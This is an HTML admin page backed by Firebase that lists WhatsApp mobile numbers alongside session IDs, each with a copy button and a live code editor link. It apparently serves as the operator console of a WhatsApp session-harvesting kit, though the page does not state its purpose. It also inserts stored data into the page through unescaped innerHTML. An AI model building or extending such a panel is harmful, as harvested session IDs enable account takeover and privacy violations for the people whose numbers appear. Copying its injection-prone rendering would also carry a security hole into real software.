<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Admin Panel - WhatsApp Sessions</title>
  <style>
    body {
      font-family: "Segoe UI", sans-serif;
      background-color: #f3fdf6;
      margin: 0;
      padding: 0;
    }

    header {
      background-color: #25d366;
      color: white;
      padding: 20px;
      text-align: center;
      font-size: 24px;
      font-weight: bold;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
      position: relative;
    }

    .menu-btn {
      position: absolute;
      top: 20px;
      right: 20px;
      background-color: white;
      color: #25d366;
      border: none;
      padding: 10px 16px;
      border-radius: 20px;
      font-weight: bold;
      cursor: pointer;
      font-size: 14px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
      transition: 0.3s;
    }

    .menu-btn:hover {
      background-color: #eafaf0;
    }

    .table-container {
      padding: 20px;
      max-width: 1000px;
      margin: 0 auto;
      overflow-x: auto;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      background: white;
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 5px 15px rgba(0,0,0,0.05);
    }

    th, td {
      padding: 16px;
      text-align: left;
      border-bottom: 1px solid #f0f0f0;
    }

    th {
      background-color: #eafaf0;
      color: #25d366;
      font-size: 16px;
    }

    td {
      font-size: 15px;
    }

    .copy-btn {
      background-color: #25d366;
      color: white;
      border: none;
      padding: 8px 14px;
      border-radius: 20px;
      cursor: pointer;
      font-weight: bold;
      transition: 0.3s ease;
    }

    .copy-btn:hover {
      background-color: #1da851;
    }

    .scroll-section {
      height: calc(100vh - 80px);
      overflow-y: auto;
    }
  </style>
</head>
<body>
  <header>
    Admin Panel -
    <button class="menu-btn" onclick="openEditor()">live code change</button>
  </header>

  <div class="scroll-section">
    <div class="table-container">
      <table id="sessions-table">
        <thead>
          <tr>
            <th>Mobile</th>
            <th>Session ID</th>
            <th>Copy Session ID</th>
          </tr>
        </thead>
        <tbody id="session-body">
          <!-- Data will be inserted here -->
        </tbody>
      </table>
    </div>
  </div>

  <!-- Firebase Scripts -->
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
      authDomain: "sbighsh.firebaseapp.com",
      projectId: "sbighsh",
      storageBucket: "sbighsh.appspot.com",
      messagingSenderId: "685947657107",
      appId: "1:685947657107:web:471a0557bb72235272a666"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const tableBody = document.getElementById("session-body");

    function createRow(mobile, sessionId) {
      const tr = document.createElement("tr");

      tr.innerHTML = `
        <td>${mobile || 'â€”'}</td>
        <td>${sessionId}</td>
        <td><button class="copy-btn" onclick="copyToClipboard('${sessionId}')">Copy</button></td>
      `;

      return tr;
    }

    function copyToClipboard(text) {
      navigator.clipboard.writeText(text).then(() => {
        alert("Copied: " + text);
      });
    }

    function openEditor() {
      window.open("live.html");
    }

    db.collection("whatsapp-number").orderBy("timestamp", "desc").onSnapshot(snapshot => {
      tableBody.innerHTML = "";
      snapshot.forEach(doc => {
        const data = doc.data();
        const tr = createRow(data.mobile, doc.id);
        tableBody.appendChild(tr);
      });
    });
  </script>
</body>
</html>
